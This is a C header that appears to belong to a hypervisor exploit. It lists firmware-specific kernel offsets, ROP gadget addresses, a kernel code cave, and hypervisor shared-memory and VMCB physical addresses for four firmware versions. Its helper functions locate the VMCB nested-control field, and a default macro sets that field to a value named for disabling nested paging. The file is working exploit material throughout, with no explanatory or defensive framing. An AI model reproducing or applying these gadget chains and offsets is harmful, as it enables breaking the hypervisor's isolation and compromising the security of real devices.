#ifndef HV_5XX_DIRECT_OFFSETS_H
#define HV_5XX_DIRECT_OFFSETS_H

#include <stdint.h>

#define HV_5XX_VMCB_STRIDE          0x2000ULL
#define HV_5XX_VMCB_NESTED_CTRL     0x90ULL
#define HV_5XX_NESTED_CTRL_NPT_OFF  0x0ULL

#ifndef HV_5XX_NESTED_CTRL_VALUE
#define HV_5XX_NESTED_CTRL_VALUE    HV_5XX_NESTED_CTRL_NPT_OFF
#endif

typedef struct hv_5xx_direct_offsets {
    uint32_t fw;

    uint64_t KERNEL_DATA_BASE;
    uint64_t VMSPACE_VM_PMAP;
    uint64_t ACPIGBL_FACS;

    uint64_t FUN_HV_UNMAP_PT_TMR;
    uint64_t FUN_MEMCPY;

    uint64_t GAD_ADD_RSP_28_POP_RBP_RET;
    uint64_t GAD_IRETQ;
    uint64_t GAD_POP_RDI_RET;
    uint64_t GAD_POP_RSI_RET;
    uint64_t GAD_POP_RDX_RET;
    uint64_t GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET;

    uint64_t KERNEL_CODE_CAVE;

    uint64_t HV_SHM_PA;
    uint64_t VMCB0_PA;
    uint64_t VCPU;
    uint64_t TMR_ID;
} hv_5xx_direct_offsets;

static inline uint64_t hv5xx_ktext_from_kdata(const hv_5xx_direct_offsets *o, uint64_t runtime_kdata)
{
    return runtime_kdata - o->KERNEL_DATA_BASE;
}

static inline uint64_t hv5xx_vmcb_pa(const hv_5xx_direct_offsets *o, unsigned core)
{
    return o->VMCB0_PA + (uint64_t)core * HV_5XX_VMCB_STRIDE;
}

static inline uint64_t hv5xx_vmcb_nested_ctrl_pa(const hv_5xx_direct_offsets *o, unsigned core)
{
    return hv5xx_vmcb_pa(o, core) + HV_5XX_VMCB_NESTED_CTRL;
}

static inline uint64_t hv5xx_tmr_entry_pa(const hv_5xx_direct_offsets *o)
{
    return o->HV_SHM_PA + o->TMR_ID * 0x18ULL + 0x298ULL;
}

static const hv_5xx_direct_offsets hv5xx_direct_0500 = {
    .fw = 0x0500,
    .KERNEL_DATA_BASE = 0x0C40000,
    .VMSPACE_VM_PMAP = 0x1D0,
    .ACPIGBL_FACS = 0x3A882A0,
    .FUN_HV_UNMAP_PT_TMR = 0xB99060,
    .FUN_MEMCPY = 0x279E30,
    .GAD_ADD_RSP_28_POP_RBP_RET = 0x983D94,
    .GAD_IRETQ = 0x23B06D,
    .GAD_POP_RDI_RET = 0x1D8778,
    .GAD_POP_RSI_RET = 0x1992B0,
    .GAD_POP_RDX_RET = 0x1FDAFC,
    .GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = 0x3F3C0A,
    .KERNEL_CODE_CAVE = 0x500,
    .HV_SHM_PA = 0x62A01000,
    .VMCB0_PA = 0x62A08000,
    .VCPU = 0,
    .TMR_ID = 0x495,
};

static const hv_5xx_direct_offsets hv5xx_direct_0502 = {
    .fw = 0x0502,
    .KERNEL_DATA_BASE = 0x0C40000,
    .VMSPACE_VM_PMAP = 0x1D0,
    .ACPIGBL_FACS = 0x3A882A0,
    .FUN_HV_UNMAP_PT_TMR = 0xB99060,
    .FUN_MEMCPY = 0x279E30,
    .GAD_ADD_RSP_28_POP_RBP_RET = 0x983D94,
    .GAD_IRETQ = 0x23B06D,
    .GAD_POP_RDI_RET = 0x1D8778,
    .GAD_POP_RSI_RET = 0x1992B0,
    .GAD_POP_RDX_RET = 0x33D532,
    .GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = 0x3F3C0A,
    .KERNEL_CODE_CAVE = 0x500,
    .HV_SHM_PA = 0x62A01000,
    .VMCB0_PA = 0x62A08000,
    .VCPU = 0,
    .TMR_ID = 0x495,
};

static const hv_5xx_direct_offsets hv5xx_direct_0510 = {
    .fw = 0x0510,
    .KERNEL_DATA_BASE = 0x0C40000,
    .VMSPACE_VM_PMAP = 0x1D0,
    .ACPIGBL_FACS = 0x3A882A0,
    .FUN_HV_UNMAP_PT_TMR = 0xB99390,
    .FUN_MEMCPY = 0x279E30,
    .GAD_ADD_RSP_28_POP_RBP_RET = 0x983FE4,
    .GAD_IRETQ = 0x23B06D,
    .GAD_POP_RDI_RET = 0x1D8778,
    .GAD_POP_RSI_RET = 0x1992B0,
    .GAD_POP_RDX_RET = 0x33D532,
    .GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = 0x3F3C0A,
    .KERNEL_CODE_CAVE = 0x500,
    .HV_SHM_PA = 0x62A01000,
    .VMCB0_PA = 0x62A08000,
    .VCPU = 0,
    .TMR_ID = 0x495,
};

static const hv_5xx_direct_offsets hv5xx_direct_0550 = {
    .fw = 0x0550,
    .KERNEL_DATA_BASE = 0x0C40000,
    .VMSPACE_VM_PMAP = 0x1D0,
    .ACPIGBL_FACS = 0x3A842A0,
    .FUN_HV_UNMAP_PT_TMR = 0xB9A180,
    .FUN_MEMCPY = 0x279DF0,
    .GAD_ADD_RSP_28_POP_RBP_RET = 0x984DD4,
    .GAD_IRETQ = 0x23B02D,
    .GAD_POP_RDI_RET = 0x1D8738,
    .GAD_POP_RSI_RET = 0x199270,
    .GAD_POP_RDX_RET = 0x33D4F2,
    .GAD_MOV_QWORD_PTR_RDI_RSI_POP_RBP_RET = 0x3F3CBA,
    .KERNEL_CODE_CAVE = 0x500,
    .HV_SHM_PA = 0x62A01000,
    .VMCB0_PA = 0x62A08000,
    .VCPU = 0,
    .TMR_ID = 0x495,
};

static inline const hv_5xx_direct_offsets *hv5xx_direct_offsets_for_fw(uint32_t fw)
{
    switch (fw) {
    case 0x0500:
        return &hv5xx_direct_0500;
    case 0x0502:
        return &hv5xx_direct_0502;
    case 0x0510:
        return &hv5xx_direct_0510;
    case 0x0550:
        return &hv5xx_direct_0550;
    default:
        return 0;
    }
}

#endif
